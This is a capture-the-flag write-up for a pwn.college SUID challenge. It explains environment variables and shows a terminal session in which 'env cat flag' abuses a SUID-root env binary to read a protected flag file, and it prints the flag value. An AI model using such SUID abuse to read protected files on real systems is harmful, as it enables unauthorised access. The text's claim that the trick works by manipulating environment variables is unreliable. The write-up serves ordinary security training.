> [!tip]
> From this level, upto level 32, the heading of the problem is `Enables you to read flags by making them execute other commands!` That means we have to read the contents of the `flag`
> file with the `help` of these commands. We will use `cat` and other commands that reads the file but with the help of this command like `env`, `make`, `nice`. You will see that.
> ```
> some command which has been SUID + 'cat' or other file reading command /flag
> ```
> 


`Environment Variables`

Ever wonder when you run `ls` in you command why you don't write the full path `/usr/bin/ls` . It seems that the computer already knows where the `ls` program is. Yes, you are correct. There is a environment variable names `PATH` where the computer looks for the executable programs or binaries.

Our computer executes program in a environment and It should know some necessary information about environment like where to look the binaries, what is the current directory, what is the name of the user. These are called `Environment Variables`.

Necessary information of the environment. As it is called `variable` that means you can change them. You can run `env` in your terminal. You would find very interesting stuff.

`Environment variable` is a very important and interesting topic. Because you can run any command in a modified environment that you want. You can escalate your privileges. Woah!

Now in this problem, we can see the `env` has SUID bit set. It means that it can be executed with the permission of the file owner(here `root`). That means we can leverage this to read the contents of the `flag` file by manipulating the environment variables.

```bash
hacker@program-misuse-level-24:~$ ls -l /usr/bin/env
-rwxr-xr-x 1 root root 43352 Sep  5  2019 /usr/bin/env
hacker@program-misuse-level-24:~$ /challenge/babysuid_level24 
Welcome to /challenge/babysuid_level24!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/env.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level24) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/env!
hacker@program-misuse-level-24:~$ ls -l /usr/bin/env
-rwsr-xr-x 1 root root 43352 Sep  5  2019 /usr/bin/env
hacker@program-misuse-level-24:~$ ls
Desktop
hacker@program-misuse-level-24:~$ cd /
hacker@program-misuse-level-24:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-24:/$ cat flag
cat: flag: Permission denied
hacker@program-misuse-level-24:/$ env cat flag
pwn.college{Q8ZqLq_xjIrGmFTepw3oTa_bBYP.0lN2EDL0AjNzQzW}
hacker@program-misuse-level-24:/$ env more flag
pwn.college{Q8ZqLq_xjIrGmFTepw3oTa_bBYP.0lN2EDL0AjNzQzW}
```

`cat flag` gives us `Permission denied`.

Here we run `env cat flag` . By executing the `cat` with `env`, I am setting up an environment where `cat` is executed with elevated permissions inherited from the `SUID` bit on `env`. This allows `cat` to access and read the contents of the file that might otherwise be inaccessible to `hacker` user which is you.

You can also run other file reading command like `more` and others as well.